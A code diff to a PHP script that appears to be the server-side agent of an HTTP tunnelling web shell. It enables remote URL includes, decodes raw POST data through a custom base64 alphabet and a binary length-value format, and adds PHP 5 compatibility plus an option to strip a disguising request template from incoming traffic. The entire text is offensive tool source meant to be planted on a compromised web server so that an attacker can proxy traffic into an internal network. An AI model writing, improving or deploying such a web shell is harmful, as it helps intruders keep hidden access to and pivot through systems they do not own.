@@ -1,13 +1,14 @@
 <?php
 ini_set("allow_url_fopen", true);
 ini_set("allow_url_include", true);
+ini_set('always_populate_raw_post_data', -1);
 error_reporting(E_ERROR | E_PARSE);
 
 if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(HTTPCODE);
 
 function blv_decode($data) {
     $data_len = strlen($data);
-    $info = [];
+    $info = array();
     $i = 0;
     while ( $i < $data_len) {
         $d = unpack("c1b/N1l", substr($data, $i, 5));
@@ -57,6 +58,10 @@ $en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 $de = "BASE64 CHARSLIST";
 
 $post_data = file_get_contents("php://input");
+if (USE_REQUEST_TEMPLATE == 1) {
+    $post_data = substr($post_data, START_INDEX);
+    $post_data = substr($post_data, 0, -END_INDEX);
+}
 $info = blv_decode(base64_decode(strtr($post_data, $de, $en)));
 $rinfo = array();
 
